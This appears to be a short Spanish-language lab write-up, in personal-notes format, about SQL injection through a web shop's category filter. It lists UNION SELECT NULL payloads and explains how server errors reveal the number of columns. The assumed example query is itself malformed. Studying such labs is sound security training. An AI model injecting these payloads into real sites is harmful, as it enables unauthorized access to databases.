## Objetivo:

![[Pasted image 20240622150116.png]]

## Solución:

Seleccionamos un filtro de categoría

![[Pasted image 20240622150251.png]]

Suponiendo que la query de categoria esta implementada de la siguiente manera
```
SELECT * FROM categories FROM category 'prueba';
```

Entonces haremos pruebas inyectando lo siguiente
```
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

Y asi de esta manera basado den el error de "Internal Server Error" podremos saber cual query de esas es completamente valida y asi detectamos el numero de columnas


![[Pasted image 20240622151149.png]]


![[Pasted image 20240622151022.png]]
